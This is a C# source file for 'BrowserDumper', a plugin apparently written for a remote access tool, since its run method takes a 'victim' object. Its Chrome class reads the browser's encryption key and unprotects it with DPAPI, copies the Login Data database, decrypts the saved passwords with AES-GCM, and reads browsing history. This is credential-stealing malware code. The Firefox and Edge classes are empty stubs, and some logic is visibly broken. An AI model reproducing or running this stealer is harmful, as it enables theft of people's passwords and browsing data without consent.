using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.Security.Cryptography;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System.Data.SQLite;
using Newtonsoft.Json;

using winClient48;
using System.IO;
using System.Diagnostics;
using System.Data;

namespace clsDumper
{
    public class clsDumper : IRemotePlugin
    {
        public string szName => "BrowserDumper";
        public string szVersion => "1.0.0";
        public string szDescription => "Browser Dumper Toolkit.";

        public struct stCredential
        {
            public string URL { get; set; }
            public string Username { get; set; }
            public string Password { get; set; }
            public DateTime CreationDate { get; set; }
            public DateTime LastUsedDate { get; set; }
        }
        public struct stCookie
        {

        }
        public struct stHistory
        {
            public string szTitle { get; set; }
            public string szURL { get; set; }
            public DateTime dtLastVisited { get; set; }
        }

        public clsDumper()
        {

        }

        public void Initialize()
        {

        }

        public void fnRun(clsVictim v, List<string> lsMsg)
        {

        }

        public class clsChromeDumper
        {
            public string m_szChromeDirectory { get; set; }
            public string m_szLoginDataPath { get { return $"{m_szChromeDirectory}\\User Data\\Default\\Login Data"; } }
            public string m_szLocalState { get { return $"{m_szChromeDirectory}\\User Data\\Local State"; } }

            public clsChromeDumper()
            {
                string szAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                m_szChromeDirectory = $"{szAppData}\\Google\\Chrome";
            }

            

            private bool fnbIsV10(byte[] data)
            {
                if (Encoding.UTF8.GetString(data.Take(3).ToArray()) == "v10")
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }

            private byte[] fnabGetKey()
            {
                string localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string FilePath = localappdata + "\\Google\\Chrome\\User Data\\Local State";
                string content = File.ReadAllText(FilePath);
                dynamic json = JsonConvert.DeserializeObject(content);
                string key = json.os_crypt.encrypted_key;
                byte[] binkey = Convert.FromBase64String(key).Skip(5).ToArray();

                byte[] decryptedkey = ProtectedData.Unprotect(binkey, null, DataProtectionScope.CurrentUser);

                return decryptedkey;
            }

            //Initial action
            private void fnPrepare(byte[] encryptedData, out byte[] nonce, out byte[] ciphertextTag)
            {
                nonce = new byte[12];
                ciphertextTag = new byte[encryptedData.Length - 3 - nonce.Length];

                System.Array.Copy(encryptedData, 3, nonce, 0, nonce.Length);
                System.Array.Copy(encryptedData, 3 + nonce.Length, ciphertextTag, 0, ciphertextTag.Length);
            }

            private string fnszDecrypt(byte[] encryptedBytes, byte[] key, byte[] iv)
            {
                string sR = string.Empty;
                try
                {
                    GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
                    AeadParameters parameters = new AeadParameters(new KeyParameter(key), 128, iv, null);

                    cipher.Init(false, parameters);
                    byte[] plainBytes = new byte[cipher.GetOutputSize(encryptedBytes.Length)];
                    Int32 retLen = cipher.ProcessBytes(encryptedBytes, 0, encryptedBytes.Length, plainBytes, 0);
                    cipher.DoFinal(plainBytes, retLen);

                    sR = Encoding.UTF8.GetString(plainBytes).TrimEnd("\r\n\0".ToCharArray());
                }
                catch
                {
                    return "Decryption failed :(";
                }

                return sR;
            }

            //Start extract the user data
            public List<stCredential> fnPasswordDumper()
            {
                string localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string LoginDataPath = localappdata + "\\Google\\Chrome\\User Data\\Default\\Login Data";
                string temp_path = Environment.SpecialFolder.Templates.ToString();
                bool is_temp = false;
                Process[] processlist = Process.GetProcessesByName("chrome");
                if (processlist.Length != 0)
                {
                    //If chrome browser is runnning, it is not able to connect Login Data file.
                    File.Copy(LoginDataPath, temp_path + "\\ChromePassword.db");
                    LoginDataPath = temp_path + "\\ChromePassword.db";
                    is_temp = true;
                }

                byte[] key = fnabGetKey();

                string connectionString = String.Format("Data Source={0};Version=3;", LoginDataPath);

                SQLiteConnection conn = new SQLiteConnection(connectionString);
                conn.Open();

                List<stCredential> creds = new List<stCredential>();

                SQLiteCommand cmd = new SQLiteCommand("select * from logins", conn);
                //SQLiteCommand cmd = new SQLiteCommand("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins && order by date_last_used", conn);
                SQLiteDataReader reader = cmd.ExecuteReader();

                while (reader.Read())
                {
                    byte[] encryptedData = (byte[])reader["password_value"];
                    if (fnbIsV10(encryptedData))
                    {
                        byte[] nonce, ciphertextTag;
                        fnPrepare(encryptedData, out nonce, out ciphertextTag);
                        string password = fnszDecrypt(ciphertextTag, key, nonce);
                        long date1 = long.Parse(reader["date_created"].ToString());
                        long date2 = long.Parse(reader["date_last_used"].ToString());
                        long date_created_convert;
                        long date_last_login_convert;
                        if (date1 != 86400000000) { date_created_convert = (date1 - 11644473600000000) / 1000000; } else { date_created_convert = date1; }
                        if (date2 != 86400000000) { date_last_login_convert = (date2 - 11644473600000000) / 1000000; } else { date_last_login_convert = date2; }
                        DateTime convert_date_1 = new DateTime(1970, 1, 1, 0, 0, 0, 0);
                        DateTime convert_date_2 = new DateTime(1970, 1, 1, 0, 0, 0, 0);
                        convert_date_1 = convert_date_1.AddSeconds(date_created_convert);
                        convert_date_2 = convert_date_2.AddSeconds(date_last_login_convert);
                        if (reader["username_value"].ToString() != "")
                        {
                            creds.Add(new stCredential
                            {
                                URL = reader["origin_url"].ToString(),
                                Username = reader["username_value"].ToString(),
                                Password = password,
                                CreationDate = convert_date_1,
                                LastUsedDate = convert_date_2
                            }); ;
                        }
                    }
                    else
                    {
                        string password;
                        try
                        {
                            password = Encoding.UTF8.GetString(ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser));
                        }
                        catch
                        {
                            password = "Decryption failed :(";
                        }
                        long date1 = long.Parse(reader["date_created"].ToString());
                        long date2 = long.Parse(reader["date_last_used"].ToString());
                        long date_created_convert;
                        long date_last_login_convert;
                        DateTime epoch_start = new DateTime(1601, 1, 1);
                        long delta1 = long.Parse(DateTime.Now.ToString()) - date1;
                        long delta2 = long.Parse(DateTime.Now.ToString()) - date2;
                        date_created_convert = long.Parse(epoch_start.ToString()) + delta1;
                        date_last_login_convert = long.Parse(epoch_start.ToString()) + delta2;
                        DateTime convert_date_1 = new DateTime(1970, 1, 1, 0, 0, 0, 0);
                        DateTime convert_date_2 = new DateTime(1970, 1, 1, 0, 0, 0, 0);
                        convert_date_1 = convert_date_1.AddSeconds(date_created_convert);
                        convert_date_2 = convert_date_2.AddSeconds(date_last_login_convert);
                        creds.Add(new stCredential
                        {
                            URL = reader["origin_url"].ToString(),
                            Username = reader["username_value"].ToString(),
                            Password = password,
                            CreationDate = convert_date_1,
                            LastUsedDate = convert_date_2
                        });
                    }
                }
                if (is_temp)
                {
                    File.Delete(temp_path);
                }
                return creds;
            }

            public List<stHistory> fnDumpHistory()
            {
                List<stHistory> ls = new List<stHistory>();
                string szFileName = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\History";

                string szConnStr = $"DataSource=;Version=3;New=False;Compress=True;";
                using (SQLiteConnection conn = new SQLiteConnection())
                {
                    conn.Open();

                    string szQuery = $"SELECT * FROM urls ORDER BY last_visit_time desc";
                    using (SQLiteDataAdapter adapter = new SQLiteDataAdapter(szQuery, conn))
                    {
                        DataSet ds = new DataSet();
                        adapter.Fill(ds);

                        if (ds != null && ds.Tables.Count > 0 && ds.Tables[0] != null)
                        {
                            DataTable dt = ds.Tables[0];
                            foreach (DataRow dr in dt.Rows)
                            {
                                string szURL = Convert.ToString(dr["url"]);
                                string szTitle = Convert.ToString(dr["title"]);

                                if (string.IsNullOrEmpty(szURL))
                                    continue;

                                long utc_microseconds = Convert.ToInt64(dr["last_visit_time"]);
                                DateTime gmt_time = DateTime.FromFileTimeUtc(10 * utc_microseconds);

                                ls.Add(new stHistory()
                                {
                                    szURL = szURL,
                                    szTitle = szTitle,
                                    //date
                                });
                            }
                        }
                    }

                    conn.Close();
                }

                return ls;
            }
        }

        public class clsFirefoxDumper
        {
            public clsFirefoxDumper()
            {

            }
        }

        public class clsEdgeDumper
        {

        }

        public class clsBravoDumper
        {

        }
    }
}